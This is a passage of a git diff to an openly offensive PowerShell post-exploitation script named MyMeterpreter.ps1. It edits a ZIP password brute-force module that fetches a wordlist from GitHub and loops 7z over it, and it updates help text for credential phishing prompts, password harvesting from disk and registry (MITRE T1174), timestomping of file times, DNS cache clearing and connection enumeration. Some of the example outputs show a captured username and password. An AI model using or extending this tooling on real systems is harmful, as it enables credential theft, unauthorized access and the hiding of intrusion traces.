+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
+   }Else{## User Input dicionary
+      $PassFile = $PassList.Split('\\')[-1]
+      Write-Host "[i] dicionary $PassFile found!"
+      Start-Sleep -Seconds 1
+      $PasFileStatus = $True
    }
 
-   ## Check for file download integrity (fail/corrupted downloads)
-   $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 4002,8544921875/KB
-   If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 4002 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
-      ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
-      Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
-      If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
-      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
+   If(-not($PasFileStatus -ieq $True)){
+      ## Check for file download integrity (fail/corrupted downloads)
+      $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
+      $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 4002,8544921875/KB
+      If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 4002 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+         ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
+         Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
+         If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
+      }Else{## Dicionary file found\downloaded
+         $tdfdr = $PassList.Split('\\')[-1]
+         Write-Host "[i] dicionary $tdfdr Dowloaded!"
+         Start-Sleep -Seconds 1
+      }
    }
    
    ## Start Brute Force Attack
+   $BruteTimer = Get-Date -Format 'HH:mm:ss'
+   Write-Host "[+] $BruteTimer - starting brute force module!" -ForeGroundColor Green
    If(Test-Path "$7z" -EA SilentlyContinue){
       $passwords = Get-Content -Path "$PassList" -EA SilentlyContinue
 
       ForEach($Item in $passwords){
          If($Thepasswordis -eq $null){
-            $BruteTimer = Get-Date -Format 'HH:mm:ss'
             $brute = &"C:\Program Files\7-Zip\7z.exe" e "$BruteZip" -p"$Item" -y
 
             If($brute -contains "Everything is Ok"){
@@ -2151,9 +2147,9 @@ If($BruteZip -ne "false"){
                Clear-Host;Start-Sleep -Seconds 1
                Write-Host "`n`n$BruteTimer - Brute force Zip archives" -ForegroundColor Green
                Write-Host "------------------------------------"
-               Write-Host "[+] Zip Archive  : $ZipArchiveName" -ForegroundColor Green
-               Write-Host "[+] Archive Size : $SizeDump/KB" -ForegroundColor Green
-               Write-Host "[+] Password     : $Thepasswordis" -ForegroundColor Green
+               Write-Host "Zip Archive  : $ZipArchiveName" -ForegroundColor Green
+               Write-Host "Archive Size : $SizeDump/KB" -ForegroundColor Green
+               Write-Host "Password     : $Thepasswordis" -ForegroundColor Green
                Write-Host "------------------------------------"
             } ## Brute IF
          } ## Check passwordis
@@ -2175,7 +2171,7 @@ If($FileMace -ne "false"){
 
    .DESCRIPTION
       This module changes the follow mace propertys:
-      creationtime, lastaccesstime, LastWriteTime
+      CreationTime, LastAccessTime, LastWriteTime
 
    .NOTES
       -Date parameter format: "08 March 1999 19:19:19"
@@ -2183,11 +2179,11 @@ If($FileMace -ne "false"){
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt
-      Changes sellected file mace using MyMeterprter default -Date value
+      Changes sellected file mace using MyMeterprter default -Date "date-format"
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt -date "08 March 1999 19:19:19"
-      Changes sellected file mace using user inputed -Date value
+      PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt -Date "08 March 1999 19:19:19"
+      Changes sellected file mace using user inputed -Date "date-format"
 
    .OUTPUTS
       FullName                        Exists CreationTime       
@@ -2421,6 +2417,18 @@ $HelpParameters = @"
       
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Enum
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Clear
+      Clear Dns Cache entrys {delete entrys}
+
+   .OUTPUTS
+      Entry                           Data
+      -----                           ----
+      example.org                     93.184.216.34
+      play.google.com                 216.239.38.10
+      www.facebook.com                129.134.30.11
+      safebrowsing.googleapis.com     172.217.21.10
    #>!bye..
 
 "@;
@@ -2430,25 +2438,32 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @itm4n|@r00t-3xp10it
-      Helper - Gets a list of listening ports (TCP)
+      Author: @r00t-3xp10it
+      Helper - Gets a list of ESTABLISHED connections (TCP)
    
    .DESCRIPTION
-      List the TCP endpoints on the local machine. For each entry in the table,
-      a custom PS object is returned, indicating the IP version, the protocol (TCP),
-      the local address, the state, the PID of the associated process and the name of the
-      process. The process name is retrieved through a call to "Get-Process -PID <PID>".
+      Enumerates ESTABLISHED TCP connections and retrieves the
+      ProcessName associated from the connection PID identifier
     
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
 
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetConnections Verbose
+      Retrieves process info from the connection PID identifier
+
    .OUTPUTS
-      IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
-      --   ----- ------------ --------- --------         -----       --- ----
-      IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
-      IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
-      IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
-      IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
+      Proto  Local Address          Foreign Address        State           Id
+      -----  -------------          ---------------        -----           --
+      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
+      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
+      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512
+
+      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+      -------  ------    -----      -----     ------     --  -- -----------
+          671      47    39564      28452       1,16  10516   4 firefox
+          426      20     5020      21348       1,47   3344   0 svchost
+         1135      77   252972     271880      30,73   5512   4 powershell
    #>!bye..
 
 "@;
@@ -2802,7 +2817,6 @@ Write-Host "$HelpParameters"
 $HelpParameters = @"
 
    <#!Help.
-   .SYNOPSIS
       Helper - Promp the current user for a valid credential.
 
    .DESCRIPTION
@@ -2819,6 +2833,13 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
       Prompt the current user for a valid credential.
+
+   .OUTPUTS
+      Captured Credentials (logon)
+      ----------------------------
+      TimeStamp : 01/17/2021 15:26:24
+      username  : r00t-3xp10it
+      password  : mYs3cr3tP4ss
    #>!bye..
 
 "@;
@@ -2969,6 +2990,40 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "MsgBox" -or $Help -ieq "TimeOut" -or $Help -ieq "ButtonType"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Spawn a msgBox on local host {ComObject}
+
+   .NOTES
+      Required Dependencies: Wscript ComObject {native}
+      Remark: Double Quotes are Mandatory in -MsgBox value
+
+      MsgBox Button Types
+      -------------------
+      0 - Show OK button. 
+      1 - Show OK and Cancel buttons. 
+      2 - Show Abort, Retry, and Ignore buttons. 
+      3 - Show Yes, No, and Cancel buttons. 
+      4 - Show Yes and No buttons. 
+      5 - Show Retry and Cancel buttons. 
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World."
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
+      Spawns message box with Yes and No buttons
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 5
+      When the Timeout is reached (seconds) the MessageBox closes.
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
 }ElseIf($Help -ieq "BruteZip" -or $Help -ieq "PassList"){
 $HelpParameters = @"
 
@@ -2978,29 +3033,26 @@ $HelpParameters = @"
 
    .DESCRIPTION
       This module brute forces ZIP archives with the help of 7z.exe
-      It also downloads custom password list from @josh-newton Git-Hub
-      repository {default} or accepts User imput password list file.
+      It also downloads custom password list from @josh-newton GitHub
+      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt
 
    .NOTES
       Author: @securethelogs|@r00t-3xp10it
       Required Dependencies: 7z.exe {manual-install}
-      Remark: Use double quotes if path contains any empty spaces
+      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
+      Remark: Use double quotes if path contains any empty spaces.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
-      Brute force the inputed -BruteZip @argument archive using default passlist
-
-   .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Archive.zip -PassList `$Env:TMP\passlist.txt
-      Brute force the inputed -BruteZip @argument archive using attacker own passlist
+      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\MyMeterpreter.zip
+      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.
 
    .OUTPUTS
       16:32:55 - Brute force Zip archives
-      ------------------------------------
-      [+] Zip Archive  : MyMeterpreter.zip
-      [+] Archive Size : 7429,9765625/KB
-      [+] Password     : King!1
-      ------------------------------------
+      -----------------------------------
+      Zip Archive  : MyMeterpreter.zip
+      Archive Size : 7429,9765625/KB
+      Password     : King!123
+      -----------------------------------
    #>!bye..
 
 "@;
@@ -3035,12 +3087,13 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
-}ElseIf($Help -ieq "GetPasswords"){
+}ElseIf($Help -ieq "GetPasswords" -or $Help -ieq "StartDir"){
 $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
       Author: @mubix|@r00t-3xp10it
+      Helper - Search for credentials in diferent locations {store|regedit|disk}
       Helper - Stealing passwords every time they change {mitre T1174}
 
    .DESCRIPTION
@@ -3061,7 +3114,7 @@ $HelpParameters = @"
       Dumps passwords from disk\regedit diferent locations
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum -StartDir $Env:USERPROFILE
       Searches for credentials recursive in text files starting in -StartDir
 
    .EXAMPLE
@@ -3085,7 +3138,7 @@ $HelpParameters = @"
 
    .DESCRIPTION
       This module changes the follow mace propertys:
-      creationtime, lastaccesstime, LastWriteTime
+      CreationTime, LastAccessTime, LastWriteTime
 
    .NOTES
       -Date parameter format: "08 March 1999 19:19:19"
@@ -3093,11 +3146,11 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt
-      Changes sellected file mace using MyMeterprter default -Date value
+      Changes sellected file mace using MyMeterprter default -Date "data-format"
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt -date "08 March 1999 19:19:19"
-      Changes sellected file mace using user inputed -Date value
+      PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt -Date "08 March 1999 19:19:19"
+      Changes sellected file mace using user inputed -Date "data-format"
 
    .OUTPUTS
       FullName                        Exists CreationTime       
